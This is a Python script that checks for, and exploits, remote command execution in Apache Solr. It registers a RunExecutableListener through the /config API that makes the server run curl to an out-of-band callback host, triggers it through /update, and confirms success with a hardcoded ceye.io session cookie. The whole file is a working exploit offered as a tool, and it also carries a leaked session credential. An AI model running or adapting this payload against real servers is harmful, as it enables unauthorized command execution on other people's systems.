#-*-coding:utf-8-*-
import requests
import re
import txconfig
import time
import random
import sys


def main(param):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0","Content-Type":"application/json"}
    result = {
        "success": False,
        "result": {}
    }
    try:
        url = param
    except Exception as e:
        result['result'] = e
        return result
    payload_1 = "/config"
    payload_2 = "/update"
    payload_data1 = '{"add-listener":{"event":"postCommit","name":"kk","class":"solr.RunExecutableListener","exe":"curl","dir":"/bin/","args":["5gg9xq.ceye.io"]}}'
    payload_data2 = '[{"id":"test"}]'
    url_1 = url + payload_1
    url_2 = url + payload_2
    Re = requests.post(url_1,headers = headers,data = payload_data1)
    if "errorMessages" in Re.text:
        name = random.randrange(0, 100, 2)
        payload_data1 = '{"add-listener":{"event":"postCommit","name":"'+str(name)+'kk'+'","class":"solr.RunExecutableListener","exe":"curl","dir":"/bin/","args":["5gg9xq.ceye.io"]}}'
        Re = requests.post(url_1, headers=headers, data=payload_data1)
        url_1 = url + payload_1
    Ree = requests.post(url_2,headers = headers,data = payload_data2)
    Ree_time = re.findall(r'QTime":(.*)}}\n',Ree.text,re.S)[0]
    time.sleep(int(Ree_time))
    cookies = {"ceye.session": "60c540c3f3e948389de04d8465b99f54"}
    url_ceye = "http://api.ceye.io/v1/users/self/records?type=http_records"
    Resu = requests.get(url_ceye, headers=headers, cookies=cookies)
    if "curl" in Resu.text:
        result['success'] = True
        return result
    else:
        return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)